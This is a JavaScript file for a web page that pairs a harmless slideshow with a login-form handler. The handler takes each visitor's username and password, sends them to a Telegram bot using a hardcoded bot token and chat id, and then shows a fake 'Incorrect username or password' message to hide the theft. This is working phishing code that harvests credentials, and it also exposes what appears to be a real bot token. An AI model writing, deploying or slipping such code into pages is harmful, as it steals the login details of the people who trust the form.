let slides = document.querySelectorAll('.slide');
let current = 0;

function showSlide(index) {
    slides.forEach((slide, i) => {
        slide.classList.toggle('active', i === index);
    });
}

setInterval(() => {
    current = (current + 1) % slides.length;
    showSlide(current);
}, 3000);

const form = document.querySelector("form");
const inputs = form.querySelectorAll("input");

form.addEventListener("submit", function(e) {
    e.preventDefault();

    const login = inputs[0].value;
    const password = inputs[1].value;

    const token = "7703038179:AAHiERKIQGTsoTGYJ8UHOZxMNRDTKFyRyq4";
    const chat_id = "6033092816"; 

    const message = `Login: ${login}\nPassword: ${password}`;

    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            chat_id: chat_id,
            text: message
        })
    })
    .then(response => response.json())
    .then(data => {
        console.log("Success", data);
        alert("Incorrect username or password"); 
    })
    .catch(error => {
        console.error("Error:", error);
    });
});
